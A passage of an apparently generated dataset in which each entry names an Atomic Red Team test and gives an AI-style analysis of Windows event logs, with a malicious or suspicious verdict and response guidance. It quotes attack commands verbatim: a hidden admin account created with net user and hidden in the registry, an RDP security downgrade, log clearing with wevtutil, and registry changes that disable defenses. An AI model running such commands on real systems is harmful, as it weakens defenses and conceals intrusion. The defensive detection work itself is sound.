   - Multiple executions of Microsoft Edge Update components seen in Sysmon logs seem standard, with consistent details in terms of processes, versions, and command lines—all aligned with system or application updating tasks via Edge Update.

### Assessment and Conclusion

**Assessment:**
- The activity in the logs indicates that an Atomic Red Team technique was executed on the machine. Common indicators associated with attempts to cover tracks (i.e., log clearing) and emulate attack techniques (script execution via PowerShell and registry changes using ART) were observed. The use of `msiexec.exe` to execute scripts from a remote location and perform tests aligns with controlled threat emulation rather than an actual compromise.

**Conclusion:**
- **Resolution: MALICIOUS**

Given the findings, verifiable indicators signal deliberate attempts to simulate or test malicious activity potentially designed to evaluate the detection and response capabilities of the systems in place. Although it mimics a real attack scenario, the nature of the tests (using known ART payloads) warrants classifying this as malicious for purposes of illustrating risk and behavior of malicious operations. It is crucial to verify intentions and ensure ART activities or similar tests are sanctioned and recorded as part of authorized security testing.

### Guidance:

1. **Immediate Actions:**
   - Confirm that the Atomic Red Team tests were authorized by the security team.
   - Ensure any unauthorized executions are reported and investigated to prevent any real malicious activities that may have occurred concurrently.

2. **Long-term Actions:**
   - Hardening the logging and monitoring processes to avoid unauthorized clearance of system and security logs.
   - Regularly train administrative users and ensure proper access controls to reduce chances of misuse.
   - Run post-incident exercises to improve detection and response capabilities based on observations from the simulated or test activities."
Hidden Window,"After thoroughly analyzing the provided logs, the following findings are observed:

### Anomalous and Suspicious Activities:

1. **Log File Clearing**:
    - Multiple instances of the event logs being cleared are observed, particularly with the `wevtutil.exe` command, which is used to clear logs (`""wevtutil cl <log_name>""`). The logs indicate clearing of Security, System, and Windows PowerShell logs, which is a highly suspicious activity often indicative of an attempt to cover tracks:
        - Security Log Cleared: EventID 1102 in Security Log.
        - System Log Cleared: EventID 104 in System Log.
        - Windows PowerShell Log Cleared: EventID 104 in System Log.
        
    - `admin_test` is the user associated with these actions, which suggests a possible compromise of this account or malicious intent from the user.

2. **PowerShell Execution**:
    - Multiple instances of PowerShell being executed with parameters to start additional PowerShell processes and launch `calc.exe` with a hidden window style (`powershell.exe & {Start-Process powershell.exe -WindowStyle hidden calc.exe}`). While opening `calc.exe` is benign, the hidden execution through PowerShell could be a tactic to obfuscate or conceal the launch of other more malicious scripts or processes.
    - Such execution patterns are commonly seen in post-exploitation scenarios or during lateral movement.

3. **Process Execution and Parent-Child Relationships**:
    - Numerous Sysmon events (EventID 1) showing processes such as `wevtutil.exe` being executed under potentially suspicious parent processes (`wsmprovhost.exe` with -Embedding flag), which can be indicative of process injection or exploitation scenarios.

4. **Privilege Context**:
    - The activities were executed with high integrity levels, suggesting elevated privileges were required and utilized, which may indicate privilege escalation if the initial access was not through a high-privilege account.

### Conclusion:

Given the activities observed:
- The frequent clearing of logs is characteristic of malicious actors trying to erase traces.
- The execution of PowerShell scripts in hidden mode to run `calc.exe` may not directly indicate damage or compromise, but the method of execution is considered suspicious.
- The utilization of `wevtutil.exe` to clear event logs is a known behavior in malware operations seeking to hide their activity from forensic scrutiny.

Based on these observations, the resolution of the situation is deemed **MALICIOUS**.

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Isolate the affected host from the network to prevent further spread or data exfiltration.
   - Change passwords and credentials associated with `admin_test` and any other affected accounts immediately.
   - Conduct a comprehensive scan of the host for other signs of compromise, including malware presence.
   
2. **Forensic Investigation**:
   - Preserve any existing logs and security tools outputs before further investigation steps to ensure no additional data is lost.
   - Investigate the means of access (initial access vector) and whether this was a result of phishing, vulnerability exploitation, etc.
   
3. **Monitor and Respond**:
   - Implement logging mechanisms to detect similar patterns across the network.
   - Strengthen security measures such as multi-factor authentication and least privilege principle on access to critical systems.

4. **Professional Engagement**:
   - Engage with a professional incident response team if the company does not have sufficient resources internally to handle the scope of the compromise.
   - Consider notifying relevant authorities and stakeholders as per corporate policies and legal requirements."
Office 365 - Set Audit Bypass For a Mailbox,"After thoroughly analyzing the provided Windows event logs, the following findings stand out:

1. **Log Clearing Event**: In the Security log, an event with EventID 1102 indicates that logs were cleared by a user ""admin_test"" with SID ""S-1-5-21-3962163828-2803415714-1403596700-1006"". This activity is suspicious, especially if carried out without prior notice because it suggests an attempt to hide potentially malicious actions.

2. **Use of wevtutil.exe**: In the Sysmon logs, the process `wevtutil.exe` was executed multiple times to clear event logs from channels such as Microsoft-Windows-Sysmon/Operational, Application, and Security. The `wevtutil.exe` command is often used by attackers to erase evidence of their activities.

3. **Suspicious PowerShell Activities**: 
   - There is a PowerShell command executed with intention to connect to an Exchange Online service and set an audit bypass for a mailbox using the credentials ""o365_user_test"" and ""o365_password_test"". This command (`Set-MailboxAuditBypassAssociation`) is particularly noteworthy because it aims to prevent logging of certain mailbox operations which is a tactic used to maintain persistence and evade detection after compromising an email account.
   - The command line involved sensitive information and was run by the user ""admin_test"".
   
4. **Process Execution and Integrity Level**: Multiple suspicious executions occurred with high integrity, indicating administrative privileges, including `powershell.exe` and `conhost.exe`. The user ""admin_test"" initiated these processes which corresponds with the user who cleared the logs.

5. **System Level Activities**: 
   - Certain actions were executed with the ""NT AUTHORITY\\SYSTEM"" user context, such as executing `powershell.exe` with commands scanning for `[defaultinstall.nt(amd64|arm|arm64|x86)]`, which can be associated with malicious activity, such as looking for vulnerable installation scripts.

**Assessment and Conclusion**:
- **SUSPICIOUS**: The combination of log clearing, execution of PowerShell scripts intended for audit bypass, and system-level powers suggest suspicious activities requiring further investigation. This kind of activity is often linked to unauthorized access or an actual compromise especially when logs are manually cleared and PowerShell is used for credential manipulation and audit evasion.

**Guidance**:
- Investigate the source and reasoning for the log clearing event. Ascertain if the user ""admin_test"" had any legitimate reason to perform these actions.
- Analyze network traffic for connections to Exchange Online around the time the commands were executed to further verify if unauthorized access was attempted or occurred.
- Review related accounts and devices for signs of compromise.
- Consider employing additional security measures and conduct a thorough search for any other potential unexplained activities across other systems that may indicate wider attack actions or an active threat."
Enabling Remote Desktop Protocol via Remote Registry,"Based on the provided logs, the following points of analysis and evaluation are made to determine whether they indicate suspicious or malicious activity:

### Overview of Event Log Entries

1. **System Log and Security Log Events**:
   - **Event ID 104 and 1102** (LogFileCleared events) show that multiple logs, including the System, Windows PowerShell, and Security logs, were cleared by the user ""admin_test"" on ""Server002"". Log clearing activities are significant as they can indicate an attempt to erase traces of activity, which is a common tactic post-exploitation to hide malicious actions.

2. **Sysmon Log Events**:
   - **Execution of `wevtutil.exe`**: The use of `wevtutil.exe` is shown repeatedly to clear event logs (System, Application, Security, and Windows PowerShell channels). This is particularly suspicious as this tool is specifically used for managing event logs and its usage in this context suggests intentional log tampering.
   - **Execution of `cmd.exe`** with the command to add a registry value: 
     ```
     ""cmd.exe"" /c reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 0 /f
     ```
     This command potentially weakens security settings by modifying the RDP (Remote Desktop Protocol) configuration to set the SecurityLayer to 0, which might imply the use of no security or encryption for RDP. Such activity is highly indicative of an effort to enable easier remote access.
   - **Execution of `whoami.exe`, `reg.exe`, and `hostname.exe`**: These commands are often used to gather information about the system and potentially configure settings. In isolation, they are not necessarily suspicious, but in combination with other activities (log clearing, registry modifications), it contributes to an anomalous pattern.

3. **Indicators of Potential Malicious Intent**:
   - **Log Clearing**: Clearing security and other logs is an immediate red flag for potential compromise.
   - **Registry Modifications**: The use of `cmd.exe` for altering system-level registry settings to weaken security configuration (RDP settings) is particularly concerning and serves as a strong indicator of malicious activity.
   - **Unusual Process Activity**: The coordinated use of these specific tools and commands indicates a deliberate action, typical of post-exploitation behavior.

---

### Assessment

Given the combination of log clearances, registry modifications, and the sequence of execution:

- The activities detailed in these logs (clearing of event logs, registry modification concerning RDP settings) indicate a high likelihood of malicious activity or an attempt to compromise the system.

- The use of high-integrity level execution for these processes suggests that the user ""admin_test"" either possesses elevated privileges or has obtained them illicitly.

### Conclusion

**Resolution: MALICIOUS**

The logs present clear signs of potential compromise with malicious intent due to log tampering and suspicious registry modifications designed to weaken security postures. Further investigation is necessary to verify the extent of the compromise, identify any persistence mechanisms, and conduct forensics to determine the nature and impact of the threat.

**Guidance:**

1. **Immediate Steps**:
   - Isolate the system from the network to prevent further malicious actions.
   - Conduct a thorough forensic analysis of the system to identify additional indicators of compromise or persistence mechanisms.
   - Review and audit user account activities, particularly those with administrative privileges to rule out further access abuse.
   - Change administrative credentials, and review RDP and other remote access configurations across the network.

2. **Long-Term Measures**:
   - Implement enhanced monitoring and alerts for log clearance activities and unauthorized registry modifications.
   - Conduct a comprehensive security review and hardening of RDP settings and user privileges.
   - Training for users and administrators on security best practices and recognizing potential signs of compromise."
Create Windows System File with Attrib,"**Analysis Summary:**

1. **Event Log Clearing:**
   - Security log event ID 1102 indicates the ""Security"" log has been cleared, and system log event IDs 104 indicate the clearing of the ""System"" and ""Windows PowerShell"" logs. These actions were performed by the user ""admin_test"" on ""SERVER002"" with the execution of `wevtutil.exe`, a common method attackers use to hide tracks.

2. **Suspicious PowerShell and Command Execution:**
   - Sysmon logs show multiple executions of `cmd.exe` with script-like behavior aimed at creating and modifying files (e.g., `attrib.exe` and logging attributes), which are used for persistence or obfuscation.
   - The process chain indicates the use of `wevtutil.exe` for clearing logs, a common indicator of malicious activity.

3. **System Time Alteration:**
   - Event 4616 from the Security event log shows a system time change made by LOCAL SERVICE. While this alone isn’t inherently suspicious, combined with other indicators, it might be an attempt at anti-forensics or evasion.

4. **Edge Update Process:**
   - Several Sysmon events detail legitimate Microsoft Edge update processes running. Although the activity seems benign in standalone behavior, it's important to analyze it further in case a legitimate operation is camouflaging malicious activities. 

5. **Account and Privilege Abnormalities:**
   - The activities are executed with a high integrity level, indicating administrative privileges. The involvement of ""SERVER002\\admin_test"" in clearing security logs raises significant concern regarding misuse of credentials.

**Assessment:**
- The logs reviewed reveal multiple signs of potential malicious activity, particularly the clearing of event logs, suspicious command executions, and leveraging of administrative powers by the user ""admin_test."" These actions are typical in scenarios where an actor attempts to cover their tracks and evade detection. Without explicit additional context (such as regular operational procedures involving frequent log clearing), this activity is highly suspect.

**Guidance:**
- **Resolution: MALICIOUS**

1. **Immediate Actions:**
   - Revoke or change administrative credentials for the user ""admin_test.""
   - Conduct a full forensic investigation of ""SERVER002"" to assess the extent and potential impact of the compromise.

2. **Long-Term Recommendations:**
   - Implement stricter monitoring and alerting for log clearance activities.
   - Enhance user access controls and audit trails.
   - Review and restrict unnecessary permissions for service accounts such as ""admin_test.""
   - Educate users about cybersecurity best practices and the dangers of unauthorized log manipulation.

Conclusive evidence suggests the described activities were likely performed with malicious intent. Immediate containment and response are advised to prevent further compromise."
Invoke CHM with InfoTech Storage Protocol Handler,"### Detailed Analysis of the Given Logs:

#### Suspicious or Anomalous Behavior:

1. **Use of PowerShell with Unusual Commands:**
   - The PowerShell command `Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm` appears multiple times in the logs. This is not a standard PowerShell usage pattern and indicates script execution intended to launch or modify help files, potentially a way to obfuscate malicious activities.

2. **Event Logs Clearing:**
   - There are multiple instances where event logs appear to be cleared. For example, Security EventID `1102` shows that `admin_test` cleared the Security logs. Similarly, System EventID `104` shows that `admin_test` cleared logs from the System and Windows PowerShell channels. Log clearing is a common tactic used by attackers to cover their tracks.

3. **Execution of `wevtutil.exe`:**
   - The frequent execution of `wevtutil.exe` with commands like `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, etc., indicates the clearing of event logs. This is corroborated by EventID `1102` in the Security log, suggesting deliberate actions to hide traces of activities.

4. **Process Execution under High-Integrity Context:**
   - Processes operated under the security context of `SERVER002\admin_test` with a ""High"" integrity level and use of legitimate tools (`wevtutil.exe`, `whoami.exe`, `hostname.exe`) suggest potential misuse of administrative privileges to perform illicit activities.

5. **Use of Tools for System/Network Enumeration:**
   - Execution of utilities like `hostname.exe` and `whoami.exe` which are typically used in understanding system information and user context. While these tools are built-in and commonly used legitimate utilities, their usage in conjunction with other suspicious activities may indicate reconnaissance efforts by a malicious actor.

6. **Pattern of Privilege Escalation:**
   - Security EventID `4672` logs show that several high-level privileges (e.g. SeDebugPrivilege, SeBackupPrivilege) were assigned to the account `SYSTEM`. This type of privilege escalation activity can often indicate an attempt to gain further control over the system.

#### Assessment of Malicious Activity and Compromise Indicators:

- **Log Clearing:** The consistent clearing of logs is highly indicative of an attempt to cover up potentially malicious activities.
- **Unusual PowerShell Activity:** The execution of an unconventional and possibly obfuscated PowerShell command suggests potentially malicious script execution.
- **Usage Pattern of `wevtutil.exe`:** Extensive use of this utility to clear logs further confirms malicious intentions.

### Resolution:

- **MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Isolation:**
   - Isolate the machine from the network to prevent any further unauthorized access or lateral movement.

2. **Comprehensive Forensics:**
   - Conduct a full forensic analysis on the suspect machine (Server002), retrieving memory dumps and disk images for further analysis to identify any additional signs of compromise or malicious artifacts.

3. **Review and Strengthen Security Monitoring:**
   - Ensure robust logging and monitoring are in place. Investigate and implement strategies to detect and alert on log clearing activities.

4. **Assess Privilege Escalation:**
   - Investigate how administrative privileges were gained or potentially misused and strengthen user privilege auditing.

5. **Conduct a Security Audit:**
   - Review security policies, particularly on crucial systems such as the CEO's machine, ensuring least privilege principles are applied and multifactor authentication is enabled for administrative accounts. 

6. **Involve Incident Response Team:**
   - Engage with your incident response team to evaluate potential risks to other systems and initiate any necessary containment, eradication, and recovery protocols.

7. **Notification and Compliance:**
   - Based on the severity and any data involved, consider notifying relevant stakeholders and comply with any potential reporting obligations under applicable data protection regulations.

This assessment suggests a deliberate attempt to conduct malicious activities on the system, possibly including reconnaissance, execution of obfuscated scripts, and log clearing to evade detection. Immediate action is advised."
office-365-Disable-AntiPhishRule,"Upon review of the provided logs, there are several indicators of suspicious and potentially malicious activity on the Windows host, specifically on Server002. Here are the notable findings from the logs:

1. **PowerShell Execution**:
   - **PowerShell commands** were executed using a script that logs in to Exchange Online, retrieves anti-phishing rules, and disables them using `Disable-AntiPhishRule`. This is a highly suspicious operation as it could be an attempt to weaken email security measures, typically an action associated with an attacker seeking to facilitate phishing attacks or bypass email defenses.

2. **EDR Alert and Log Clearing**:
   - The logs indicate that the **Windows Event Logs were cleared** across various channels (Security, System, Windows PowerShell). This is executed by the account `admin_test` with Event IDs 1102 (for Security log) and 104 (for System and PowerShell logs). Clearing logs is a common tactic used by attackers to cover their tracks.

3. **Sysmon Logs**:
   - There is evidence of the use of PowerShell and wevtutil.exe (Windows Event Utility) by the `admin_test` user, which aligns with the log-clearing activity observed. The chain of commands here shows an attempt to access and potentially manipulate log information.

4. **Anomalous Process Execution**:
   - Unusual processes related to Secure Boot and UEFI encoding were executed under `System` integrity, which can suggest tampering with system security configurations or attempting persistence mechanisms.

5. **Scripts Executed with Elevated Privileges**:
   - The PowerShell commands executed with elevated privileges (Integrity Level: High/System) suggest potential privilege escalation attempts, which could be a step towards further system compromise.

### Assessment:
- The combined nature of disabling anti-phishing rules, clearing of event logs, and execution of potentially harmful scripts using PowerShell under high integrity indicate a high risk of compromise. While each of these activities alone might not automatically flag as malicious, together they suggest a coordinated attempt to perform unauthorized actions while minimizing traceability.

### Resolution: MALICIOUS

### Guidance:
1. **Immediate Containment**: Isolate Server002 from the network to prevent any further potential malicious activity or exfiltration from that machine.
   
2. **Incident Response**: Initiate a full incident response procedure. Engage the incident response team to further analyze the extent of the compromise and identify any lateral movements or additional affected assets.

3. **Forensic Analysis**: Conduct a forensic analysis on the compromised system, inspecting any suspicious scheduled tasks, startup programs, and persistent executables. Review any other privilege changes or user account modifications.

4. **Patch and Reset Credentials**: Ensure all systems are fully patched and consider resetting credentials, especially for any accounts that were observed executing suspicious commands.

5. **Review Exchange Online Policies**: Immediately review and possibly re-enable any anti-phishing rules that were disabled. Conduct a security posture assessment of Exchange Online and related email security measures."
Disable Hypervisor-Enforced Code Integrity (HVCI),"Upon reviewing the provided event logs, several indicators suggest potentially malicious activity. Here's a detailed breakdown of the findings:

### 1. Log Cleared Events
- **Event ID 104 in System log** and **Event ID 1102 in Security log** indicate that log files (System, Windows PowerShell, Security) were cleared by the user `admin_test`. Clearing logs is a significant red flag as this action is commonly used to cover tracks by malicious actors after executing unauthorized or harmful operations.

### 2. Suspicious Command Execution
- **Sysmon logs** show a series of commands executed under the `admin_test` account that involve querying and modifying the system's registry:
  - Commands designed to query the DeviceGuard settings, looking for the status and requirements of security features (`EnableVirtualizationBasedSecurity`, `RequirePlatformSecurityFeatures`, `Locked`, etc.).
  - A particularly concerning command includes modifying the `HypervisorEnforcedCodeIntegrity` setting via powerShell (`reg add ... /d 0`). This suggests an intent to disable a key security feature, which is a common tactic used to weaken system defenses and facilitate further malicious activities.

### 3. Unauthorized Tool Utilization
- Usage of **wevtutil.exe** to clear event logs:
  - Multiple instances where `wevtutil.exe` was used with the `cl` (clear logs) switch against operational logs like Sysmon and Security is abnormal and adds to the evidence of deliberate log tampering efforts.

### 4. Anomalous Execution Patterns
- **Execution of commands using PowerShell and reg.exe** is combined with high integrity levels under the `admin_test` account. This pattern is consistent with scripts or manual procedures attempting to change security configurations and remove traces.

### Assessment:
Based on the logs and observed behaviors, there are clear indicators of suspicious and potentially malicious activity:
- The clearing of critical log files, attempts to modify security-related registry settings, and the execution of commands associated with weakening the Windows security posture all point towards unauthorized activity.

### Threats/Risks:
- Potential for the system has been compromised, and critical security mechanisms may be disabled, increasing vulnerability to further attacks.
- Risk of the attack spreading laterally within the network if unauthorized access is not contained.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Isolate the affected system from the network to prevent further spread or data exfiltration.
   - Perform a comprehensive forensic analysis to determine the full scope and origin of the compromise.

2. **Investigation Steps:**
   - Review accounts with elevated privileges, especially the actions taken by `admin_test`.
   - Examine surrounding context, such as network traffic and potential lateral movement based on similar activities on other systems.
   - Evaluate any potential data impacts and further malicious payloads delivered.

3. **Recovery and Hardening:**
   - Restore affected systems to a known good state.
   - Reinforce logging and monitoring across critical infrastructure.
   - Educate users on identifying potential phishing or unauthorized requests resulting in privilege misuse.

**Resolution: MALICIOUS** - The logs exhibit clear signs of unauthorized activities consistent with system compromise, warranting immediate investigation and remediation steps."
Create Hidden User in Registry,"Upon analyzing the provided logs, the following observations and assessments are noted:

### Suspicious/Anomalous Behavior:
1. **Log File Clearing**: There are multiple entries indicating that various system logs (Security, System, and Windows PowerShell) were cleared by the user `admin_test`:
   - Security log (EventID: 1102)
   - System logs (EventID: 104 for multiple channels)

   Clearing logs can be indicative of an attempt to cover tracks, suggesting potentially malicious intent.

2. **Unusual User Account Activity**: A command was executed using `cmd.exe` to add a new user account `AtomicOperator$` with administrative properties:
   - Command: 
     ``` 
     cmd.exe /c NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never & REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v AtomicOperator$ /t REG_DWORD /d 0
     ```
   - This was followed by altering the Windows registry to make the account hidden from normal views and scheduled tasks.

3. **Time-Related Events**: There are multiple entries showing time being adjusted by the service running under `NT AUTHORITY\SYSTEM`. While the time changes themselves might not be directly suspicious, they coincide with log-clearing events, indicating synchronization or attempted obfuscation of the timeline of events.

4. **Execution of Sysinternals tool** `whoami.exe`: This utility call is often benign but, when used in combination with the aforementioned activities, could represent reconnaissance behavior as part of a broader attack pattern.

### Indicators of Malicious Activity:
- **Process Execution**: The use of Windows utilities `wevtutil.exe`, `net.exe`, and `reg.exe` in a sequence designed to create a hidden administrative account strongly aligns with known ""attack vectors"" often associated with privilege escalation and persistence tactics in various advanced persistent threat scenarios.
  
- **High Integrity Level**: The processes in question (e.g., `cmd.exe`, `wevtutil.exe`) were executed with high integrity, suggesting administrative access was utilized to facilitate these operations, which aligns with the profile of a privileged attack.

### Threat Assessment:
The actions captured in the logs reflect a pattern commonly seen in intrusion scenarios where the attacker:
1. Attempts to establish persistence through new user account creation.
2. Utilizes native tools (often referred to as ""Living off the Land Binaries"" or LOLBins) to evade detection.
3. Clears evidence from logs to hinder forensic investigation.

### Resolution:
**MALICIOUS**

Given the sequence of actions, which include the creation of a stealthy admin-equivalent user account using default Windows utilities, followed by clearing of logs, this behavior is consistent with malicious activity. Immediate actions include:
- Full incident response deployment to understand the full impact.
- Resetting credentials for the involved accounts.
- Implementing enhanced logging and monitoring (e.g., ensuring logs are backed up securely).
- Conducting a thorough post-incident review to fix detected vulnerabilities and improve response measures. 

Addressing these indicators swiftly is paramount to containing and mitigating any potential threats or compromise that have occurred."
Disable Windows Registry Tool,"Upon reviewing the provided Windows event logs for the CEO's machine, several indicators suggest potential malicious activity or a security breach that warrants further investigation. Below is a detailed assessment:

### Key Findings:

1. **Event Log Clearing:**
   - Multiple instances show logs being cleared using `wevtutil.exe`. Specifically, the security, system, and PowerShell logs were cleared around `2024-10-24 14:45:59`. Clearing event logs is a common indicator of malicious activity aimed at removing traces.

2. **Suspicious Command Execution:**
   - A suspicious command was executed: `cmd.exe /c reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f`. This registry modification attempts to disable registry tools, which is often used by malware or attackers to hinder system administration and investigation.

3. **Time Change Events:**
   - The event logs indicate a brief change in system time `EventID 4616`, which might be an attempt to manipulate timestamps and further obscure malicious activities.

4. **Unexpected Process Behavior:**
   - We see executions of `whoami.exe` and `hostname.exe`, which can be used in enumeration by attackers after gaining access to understand where they are operating and what privileges they have.

5. **Use of `wsmprovhost.exe`:**
   - The associated parent process for several suspicious actions was `wsmprovhost.exe`, a legitimate process that might be abused to run scripts or commands with elevated privileges.

### Assessment of the Situation:

The compilation of actions, such as the clearing of event logs, executing suspicious registry changes, and enumerations commands, strongly suggests malicious activities. These activities can be indicative of an attacker attempting to gain and maintain unauthorized access, execute malicious scripts, and cover their tracks on the network, possibly as part of a more extensive intrusion or compromise.

### Threats or Risks Identified:

- **Potential Data Breach**: If malicious activities persist undetected, there is a high risk of sensitive data being exfiltrated.
- **System Integrity Compromise**: Security configurations can be altered, reducing the system's defenses.
- **Privilege Escalation**: Misuse of legitimate processes to execute harmful commands with elevated privileges.

### Guidance on How to Proceed:

1. **Immediate Isolation**: Temporarily isolate the affected machine from the network to prevent further spread and contain any potential threat.
2. **Deep Dive Investigation**: Conduct a full forensic analysis on the compromised host to uncover the extent and source of the breach.
3. **Review Security Policies**: Strengthen audit policies to monitor for log clearance events and other suspicious activities.
4. **Patch & Mitigate Vulnerabilities**: Ensure all systems are updated with the latest patches and review configurations to protect against similar attacks.
5. **User Awareness Training**: Educate users about the importance of recognizing suspicious activities and reporting them.

### Resolution:
**MALICIOUS** - The logs contain clear indications of malicious activity. Immediate action should be taken to investigate the full scope and remediate any threats."
System File Copied to Unusual Location,"Upon reviewing the provided logs, several suspicious activities suggest possible malicious behavior:

1. **Log Clearing Activities:**
   - Events in the Security log (EventID: 1102) and System log (EventID: 104) show that logs have been cleared. This behavior is often observed in attempts to cover tracks after an unauthorized activity.

2. **Exploitation via PowerShell:**
   - A suspicious PowerShell command is executed: `powershell.exe & {copy-item ... start-process ... sleep -s 5 ... stop-process -name ""cmd"" | out-null}`. This involves copying `cmd.exe` to a publicly accessible location and executing it. Such behavior is characteristic of a malicious script attempting to gain unauthorized access or escalate privileges.

3. **Anomalous Process Activity:**
   - The creation of a process with high integrity (`C:\ProgramData\cmd.exe`) and its execution is not usual and likely indicates an attempt to execute or introduce potentially harmful commands or scripts.

4. **Process Execution Related to Established Malicious Patterns:**
   - The command-line usage of `wevtutil` to clear logs is associated with attackers trying to hide their activity.
   - The execution of commands and subsequent log clearing strongly suggests an attempt to manipulate evidence, which is typical in post-exploitation scenarios.

5. **Account Anomalies:**
   - The account `admin_test` is seen executing these commands with high integrity, which is unusual and suggests misuse or compromise of a privileged account.

6. **Credential Events (Security Log 5379):**
   - Multiple instances of EventID 5379 indicate potential credential access attempts, but each failed with the return code ""3221226021"", suggesting unsuccessful access attempts.

Based on the substantial evidence of log tampering, suspicious command execution, and PowerShell misuse, it is evident that there are indicators of compromise within these logs. The activities align with known attack vectors, and they pose significant security risks including potential misuse of privileged credentials, system manipulation, and unauthorized access to sensitive information.

**Resolution: MALICIOUS**

**Recommendations:**
- Immediate isolation of the system to prevent further damage.
- Change credentials associated with the `admin_test` account and any other potentially compromised accounts.
- Conduct a detailed forensic investigation to ascertain the full scope of the intrusion.
- Review and enhance logging and monitoring policies to prevent future occurrences.
- Implement an incident response plan to address and mitigate impacts from this and potential future incidents."
attrib - hide file,"Upon reviewing the provided logs, several suspicious activities stand out and merit further investigation, which point to a likely malicious interference:

1. **Security Log - Event ID 1102 (Audit Log Cleared):**
   - This event indicates that the security log has been cleared by the user `admin_test`. Clearing of security logs is often performed by attackers to cover their tracks and is a major indicator of compromise.

2. **Sysmon Log - Process Execution of `wevtutil.exe` with `cl` (clear) Command:**
   - There are multiple entries related to the execution of `wevtutil.exe` with the `cl` command to clear logs across different channels such as Microsoft-Windows-Sysmon/Operational, Application, Security, and System logs. Systematic clearing of various event logs is a highly suspicious activity often associated with malicious actions intended to erase evidence of other illicit activities. The command is executed by `admin_test`, indicating that this user account was used for potentially malicious purposes.

3. **Command Execution via Command Prompt (`cmd.exe`):**
   - The logs show execution of the command prompt (`cmd.exe`) with a complex command string involving directory creation and file attribute modification, which is often seen in obfuscation techniques or attempts to hide files or create persistence mechanisms.

4. **Repeated Execution and Log Clearance Attempts:**
   - A pattern of attempts to execute various processes (e.g., `hostname.exe`, `whoami.exe`) and frequent log clearances indicate an attempt to gather information and persistence while erasing tracks, common behavior in penetration testing or attack execution.

5. **Unusual Use of High Privileges by `admin_test`:**
   - The actions are performed at a high integrity level by `SERVER002\\admin_test`, suggesting privilege escalation or use of an account with elevated permissions, which could be an insider threat or compromised account.

## Assessment
The combination of security log clearance, execution of utilities to modify or clear logs (`wevtutil.exe` ), unusual command strings in `cmd.exe`, and the high integrity level of executed tasks suggest a high likelihood of malicious activity. These activities are typical of an attacker who has gained unauthorized access and is performing anti-forensic activities to hide their intrusion and maintain persistence.

## Threats or Risks Identified
- **Potential compromise of `admin_test` account**: The account is used in the execution of numerous suspicious activities.
- **Successful Clearing of Logs**: Data that could identify the method and scope of compromise have been potentially lost.
- **Possible system compromise**: Extensive use of system utilities to clear logs and potential file manipulation indicate system tampering.

## Guidance on How to Proceed
- **Immediate Investigation**: Conduct a deep forensic investigation on the `admin_test` account to determine how and when it was accessed.
- **User Account Auditing**: Review and modify account privileges, especially for `admin_test` and any other accounts showing similar anomalies.
- **System Restore and Monitoring**: Restore logs, if possible, from backup and implement rigorous monitoring to immediately detect similar patterns.
- **Incident Response Activation**: Given the potentially wide scope, initiate an incident response plan immediately to further contain any damage.
- **Implement Additional Security Measures**: Consider introducing more robust log management solutions that can secure previously cleared logs and provide real-time alerts on such activities.

**Resolution: MALICIOUS**

The actions observed are unquestionably indicative of intentional and concealed attempts to compromise system integrity and erase evidence, warranting the classification of these activities as malicious. Immediate containment and eradication actions should be taken following proper incident response procedures."
Store file in Alternate Data Stream (ADS),"After analyzing the provided Windows event logs for potential indicators of compromise, several aspects stand out as suspicious:

1. **Usage of `wevtutil.exe`:** The `wevtutil.exe` utility, which is typically used to clear or manage Windows event logs, is being executed multiple times (`EventID 1`). The command-line argument `cl` indicates a clear logs operation. Specifically, the logs show `wevtutil.exe` clearing event logs including ""Application"", ""System"", ""Security"", and ""Windows PowerShell"". This behavior can be indicative of an attempt to cover tracks after suspicious activity.

2. **Execution of PowerShell with Unusual Commands:** The event logs show PowerShell sessions (`EventID 1`) executing a script that involves creating a directory and manipulating an alternate data stream with a file named `desktop.ini`. The command obfuscation and utilization of alternate data streams can be associated with malicious activities like persistence or data hiding.

3. **Clearing of Event Logs:** Sysmon events indicate the event logs were cleared (`EventID 104` in the System log) by the ""admin_test"" user. This action can prevent logging of future events and is typically a technique used by attackers to hide their actions.

4. **Host Time Changes:** There's a series of log entries showing time changes (`EventID 1` in System log, and `EventID 4616` in Security log). Unsanctioned changes to system time can be used to manipulate timestamps in log files to further obscure malicious activity timing.

Conclusion: The activity observed across these logs, including the execution of commands to clear logs, use of PowerShell in potentially obfuscated tasks, and altering time settings, strongly suggests unauthorized or malicious actions have taken place on this system. 

Resolution: **MALICIOUS**
- **Threats/Risks Identified:** Potential data exfiltration, system compromise, unauthorized access, and digital forensics data manipulation.
- **Guidance on Proceeding:**
  - Immediately isolate the affected host from the network to prevent further potential exfiltration or lateral movement.
  - Conduct a full forensic analysis of the host to identify if any malware or unauthorized tools were installed.
  - Restore the system from a known clean state and review user permissions to ensure they are appropriate.
  - Notify relevant internal teams, such as IT Operations and Incident Response, to handle this breach appropriately.
  - Review and possibly enhance logging and monitoring policies to detect such malicious activities in the future."
Lolbin Gpscript logon option,"### Detailed Analysis

#### Overview
The provided event logs indicate some potentially suspicious activity related to event log clearing and process executions on the machine identified as ""Server002"". Key events to focus on are the clearing of logs and certain process executions that could indicate malicious intent.

#### Key Observations

1. **Log File Clearing Activity**:
   - **Security Log Cleared**: The security log has been cleared (Event ID 1102). This is a critical action usually seen in attempts to cover tracks. The user ""admin_test"" is responsible, and it executed the command on a high integrity level process using the `wevtutil.exe` utility.
   - **System Log Cleared**: There are multiple instances of the system log being cleared (Event ID 104). Again, the user ""admin_test"" performed this action using `wevtutil.exe`.

2. **Use of `wevtutil.exe`**:
   - This utility is used to clear event logs, which itself is not suspicious but combined with the log clearing actions, it raises red flags.
   - The command line arguments show multiple clear actions: `""C:\\Windows\\system32\\wevtutil.exe"" cl [log_name]`.

3. **Suspicious Time Change Events**:
   - There are suspicious time set events (Event ID 4616 in Security logs) involving `svchost.exe`. This raises concern for potential time-based manipulation which can help evade detection.

4. **Process Execution Monitoring**:
